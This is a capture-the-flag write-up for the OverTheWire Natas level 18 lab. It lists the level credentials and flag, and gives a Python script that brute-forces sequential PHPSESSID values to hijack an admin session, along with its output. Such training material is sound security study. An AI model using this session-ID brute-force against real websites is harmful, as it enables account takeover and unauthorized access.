# Natas18

*	user: `natas18`
*	pass: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`
*	url: `http://natas18.natas.labs.overthewire.org`
*	flag: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`

## Procedure

1.	In source code, directive

		$maxid = 640; // 640 should be enough for everyone

	suggests us that `PHPSESSID` may be at least `640`. This number is
	sufficiently low to allow a brute-force attack against `PHPSESSID`
	variable in order to perform [Session Hijacking](http://en.wikipedia.org/wiki/Session_hijacking).

2.	A simple Python script (see [natas18.py](./scripts/natas18.py)) will
	do it on behalf of us

		import requests

		target = 'http://natas18.natas.labs.overthewire.org'
		auth = ('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
		params = dict(username='admin', password='s3cr3t')
		cookies = dict()

		max_s_id = 640
		s_id = 1
		while s_id <= max_s_id:
			print "Trying with PHPSESSID = " + str(s_id)
			cookies = dict(PHPSESSID=str(s_id))
			r = requests.get(target, auth=auth, params=params, cookies=cookies)
			if "You are an admin" in r.text:
				print r.text
				break
			s_id += 1

	This is the result

		$ python natas18.py
		Trying with PHPSESSID = 1
		Trying with PHPSESSID = 2
		...
		Trying with PHPSESSID = 45
		Trying with PHPSESSID = 46
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
		<body>
		<h1>natas18</h1>
		<div id="content">
		You are an admin. The credentials for the next level are:<br><pre>Username: natas19
		Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>
